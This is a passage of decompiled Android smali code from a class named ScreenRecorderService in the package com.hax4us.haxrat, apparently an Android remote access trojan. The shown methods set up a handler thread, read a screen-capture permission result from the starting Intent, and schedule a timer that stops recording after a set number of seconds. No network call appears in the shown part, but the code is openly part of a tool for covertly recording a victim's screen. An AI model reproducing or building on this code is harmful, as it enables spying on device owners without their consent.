    invoke-virtual {v6, v7, v8}, Lcom/hax4us/haxrat/ScreenRecorderService;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    move-result-object v6

    .line 138
    new-instance v6, Landroid/os/HandlerThread;

    move-object v11, v6

    move-object v6, v11

    move-object v7, v11

    const-string v8, "ServiceStartArguments"

    const/16 v9, 0xa

    invoke-direct {v7, v8, v9}, Landroid/os/HandlerThread;-><init>(Ljava/lang/String;I)V

    move-object v3, v6

    .line 140
    move-object v6, v3

    invoke-virtual {v6}, Landroid/os/HandlerThread;->start()V

    .line 142
    move-object v6, v3

    invoke-virtual {v6}, Landroid/os/HandlerThread;->getLooper()Landroid/os/Looper;

    move-result-object v6

    move-object v4, v6

    .line 143
    move-object v6, v0

    new-instance v7, Lcom/hax4us/haxrat/ScreenRecorderService$ServiceHandler;

    move-object v11, v7

    move-object v7, v11

    move-object v8, v11

    move-object v9, v0

    move-object v10, v4

    invoke-direct {v8, v9, v10}, Lcom/hax4us/haxrat/ScreenRecorderService$ServiceHandler;-><init>(Lcom/hax4us/haxrat/ScreenRecorderService;Landroid/os/Looper;)V

    iput-object v7, v6, Lcom/hax4us/haxrat/ScreenRecorderService;->mServiceHandler:Lcom/hax4us/haxrat/ScreenRecorderService$ServiceHandler;

    return-void
.end method

.method public onDestroy()V
    .locals 0
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 14
    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 150
    move-object v0, p0

    move-object v1, p1

    move/from16 v2, p2

    move/from16 v3, p3

    move-object v9, v0

    move-object v10, v1

    const-string v11, "resultCode"

    const/4 v12, 0x0

    invoke-virtual {v10, v11, v12}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result v10

    iput v10, v9, Lcom/hax4us/haxrat/ScreenRecorderService;->resultCode:I

    .line 151
    move-object v9, v0

    move-object v10, v1

    const-string v11, "android.intent.extra.INTENT"

    invoke-virtual {v10, v11}, Landroid/content/Intent;->getParcelableExtra(Ljava/lang/String;)Landroid/os/Parcelable;

    move-result-object v10

    check-cast v10, Landroid/content/Intent;

    iput-object v10, v9, Lcom/hax4us/haxrat/ScreenRecorderService;->data:Landroid/content/Intent;

    .line 152
    move-object v9, v1

    const-string v10, "secs"

    const/4 v11, 0x0

    invoke-virtual {v9, v10, v11}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result v9

    move v5, v9

    .line 153
    move v9, v5

    invoke-static {v9}, Ljava/lang/Integer;->toString(I)Ljava/lang/String;

    move-result-object v9

    move-object v6, v9

    .line 154
    const-string v9, "TAGG"

    new-instance v10, Ljava/lang/StringBuffer;

    move-object v13, v10

    move-object v10, v13

    move-object v11, v13

    invoke-direct {v11}, Ljava/lang/StringBuffer;-><init>()V

    const-string v11, "secs are :"

    invoke-virtual {v10, v11}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v10

    move-object v11, v6

    invoke-virtual {v10, v11}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-static {v9, v10}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    move-result v9

    .line 156
    move-object v9, v0

    iget v9, v9, Lcom/hax4us/haxrat/ScreenRecorderService;->resultCode:I

    const/4 v10, 0x0

    if-eq v9, v10, :cond_0

    move-object v9, v0

    iget-object v9, v9, Lcom/hax4us/haxrat/ScreenRecorderService;->data:Landroid/content/Intent;

    if-nez v9, :cond_1

    .line 157
    :cond_0
    new-instance v9, Ljava/lang/IllegalStateException;

    move-object v13, v9

    move-object v9, v13

    move-object v10, v13

    const-string v11, "Result code or data missing."

    invoke-direct {v10, v11}, Ljava/lang/IllegalStateException;-><init>(Ljava/lang/String;)V

    throw v9

    .line 160
    :cond_1
    move-object v9, v0

    iget-object v9, v9, Lcom/hax4us/haxrat/ScreenRecorderService;->mServiceHandler:Lcom/hax4us/haxrat/ScreenRecorderService$ServiceHandler;

    invoke-virtual {v9}, Lcom/hax4us/haxrat/ScreenRecorderService$ServiceHandler;->obtainMessage()Landroid/os/Message;

    move-result-object v9

    move-object v7, v9

    .line 161
    move-object v9, v7

    move v10, v3

    iput v10, v9, Landroid/os/Message;->arg1:I

    .line 162
    move-object v9, v0

    iget-object v9, v9, Lcom/hax4us/haxrat/ScreenRecorderService;->mServiceHandler:Lcom/hax4us/haxrat/ScreenRecorderService$ServiceHandler;

    move-object v10, v7

    invoke-virtual {v9, v10}, Lcom/hax4us/haxrat/ScreenRecorderService$ServiceHandler;->sendMessage(Landroid/os/Message;)Z

    move-result v9

    .line 164
    move-object v9, v0

    new-instance v10, Lcom/hax4us/haxrat/ScreenRecorderService$100000000;

    move-object v13, v10

    move-object v10, v13

    move-object v11, v13

    move-object v12, v0

    invoke-direct {v11, v12}, Lcom/hax4us/haxrat/ScreenRecorderService$100000000;-><init>(Lcom/hax4us/haxrat/ScreenRecorderService;)V

    iput-object v10, v9, Lcom/hax4us/haxrat/ScreenRecorderService;->mStopRecording:Ljava/util/TimerTask;

    .line 175
    new-instance v9, Ljava/util/Timer;

    move-object v13, v9

    move-object v9, v13

    move-object v10, v13

    invoke-direct {v10}, Ljava/util/Timer;-><init>()V

    move-object v10, v0

    iget-object v10, v10, Lcom/hax4us/haxrat/ScreenRecorderService;->mStopRecording:Ljava/util/TimerTask;

    move v11, v5

    const/16 v12, 0x3e8

    mul-int/lit16 v11, v11, 0x3e8

    int-to-long v11, v11

    invoke-virtual {v9, v10, v11, v12}, Ljava/util/Timer;->schedule(Ljava/util/TimerTask;J)V

    .line 177
    const/4 v9, 0x3

    move v0, v9

    return v0
.end method
